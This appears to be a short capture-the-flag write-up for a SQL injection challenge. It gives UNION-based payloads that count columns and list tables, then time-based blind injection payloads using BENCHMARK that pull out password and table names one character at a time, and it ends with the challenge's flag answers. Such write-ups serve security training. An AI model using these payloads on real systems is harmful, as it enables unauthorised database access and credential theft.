Hint: use Blind injection.

1. Find the number of columns of images table:
   - ' UNION SELECT NULL, NULL; -- -
2. Find all tables:
   - ' UNION SELECT group_concat(table_name), NULL from information_schema.tables where table_schema=database(); -- -
   - Not good, because need to display the information but in this case we can't
   - check [link1](https://owasp.org/www-community/attacks/Blind_SQL_Injection) and [link2](https://www.netsparker.com/blog/web-security/how-blind-sql-injection-works/) for **Blind Injection**, in particular time-based injection

Examples:
- 1' UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')), NULL), NULL; -- -
- 1' UNION SELECT IF(SUBSTRING(group_concat(table_name),1,1) = CHAR(50), BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')), NULL), NULL from information_schema.tables where table_schema=database(); -- -

Need script to test out all positions and characters. Check `script.py`. 

(Note: the found solution is uppercased, may need to lowercase it before submitting)

Flag: secret{t4dgizxxdgkaqupb2zkf}

Flag: secret{T4dGIZxXDGkAqupB2ZKf} [case sensitive]